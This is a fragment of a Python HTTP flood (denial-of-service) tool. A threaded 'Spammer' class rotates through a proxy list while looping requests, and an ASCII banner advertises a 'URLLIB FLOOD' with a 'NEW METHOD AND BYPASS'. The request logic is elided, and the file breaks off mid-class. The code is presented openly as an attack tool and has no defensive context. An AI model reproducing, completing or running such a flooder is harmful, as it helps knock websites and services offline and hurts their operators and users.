...
class Spammer(threading.Thread):
    ...
    def request(self):
        ...
        sys.stdout.write("Virtualization DoS #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
    def run(self):
        global N
        self.Lock.acquire()
        print ("Virtualization DoS #%4d |"% (self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
        ...
        sys.exit(0)
def title():
    stdout.write("____   ____.__         __               .__  .__                __  .__                 \n")
    stdout.write("\   \ /   /|__|_______/  |_ __ _______  |  | |__|____________ _/  |_|__| ____   ____    \n")
    stdout.write(" \   Y   / |  \_  __ \   __\  |  \__  \ |  | |  \___   /\__  \\   __\  |/  _ \ /    \   \n")
    stdout.write("  \     /  |  ||  | \/|  | |  |  // __ \|  |_|  |/    /  / __ \|  | |  (  <_> )   |  \  \n")
    stdout.write("   \___/   |__||__|   |__| |____/(____  /____/__/_____ \(____  /__| |__|\____/|___|  /  \n")
    stdout.write("                                      \/              \/     \/                    \/   \n")
    stdout.write("                   ""                                                \n")
    stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+"║         Virutalizaon URLLIB FLOOD             ""      ║\n")
    stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
    stdout.write("             "+"║           Facebook : VoLeMinh.info   ""               ║\n")
    stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
class MainLoop():
